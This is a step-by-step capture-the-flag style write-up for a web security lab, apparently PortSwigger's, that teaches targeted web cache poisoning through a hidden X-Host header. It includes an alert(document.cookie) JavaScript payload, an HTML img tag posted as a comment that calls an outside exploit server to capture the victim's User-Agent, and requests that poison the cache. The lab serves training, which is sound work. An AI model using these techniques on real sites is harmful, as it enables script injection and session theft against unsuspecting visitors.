# Targeted web cache poisoning using an unknown header

## Description

[This lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header) is vulnerable to web cache poisoning. A victim user will view any comments that you post.

## Reproduction

1. With Burp running, load the website's home page.
2. In Burp, go to **Proxy -> HTTP history** and study the requests and responses generated. Find the `GET` request for the home page.
3. With the **Param Miner** extension enabled, right-click on the request and select **Guess headers**. After a while, **Param Miner** will report that there is a secret input in the form of the `X-Host` header.
4. Send the `GET` request to Burp Repeater and add a cache-buster query parameter, such as `?cb=1234`.
5. Add the `X-Host` header with an arbitrary hostname, such as `example.com`. The value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at `/resources/js/tracking.js`.
6. Go to the exploit server and change the file name to match the path used by the vulnerable response:

```text
/resources/js/tracking.js
```

7. In the body, enter the payload `alert(document.cookie)` and store the exploit.
8. Go back to the request in Burp Repeater and set the `X-Host` header with the exploit server url:

```text
X-Host: your-exploit-server-id.web-security-academy.net
```

9. Send the request until you see the exploit server URL reflected in the response and `X-Cache: hit` in the headers.
10. To simulate the victim, load the URL in your browser and make sure that the `alert()` fires.
11. The `Vary` header is used to specify that the `User-Agent` is part of the cache key. To target the victim, you need to find out their `User-Agent`.
12. On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example:

```text
<img src="https://exploit-0a21009d04709c47c10d2f60017e00dc.exploit-server.net/foo" />
```

13. Go to the blog page and double-check that your comment was successfully posted.
14. Go to the exploit server and click the button to open the **Access log**. Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their `User-Agent` from the log.
15. Go back to your malicious request in Burp Repeater and paste the victim's `User-Agent` into the corresponding header. Remove the cache buster.
16. Keep sending the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers.
17. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.

## Exploitability

An attacker will need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser; and also needs to make sure that the response is served to the specific subset of users to which the intended victim belongs.
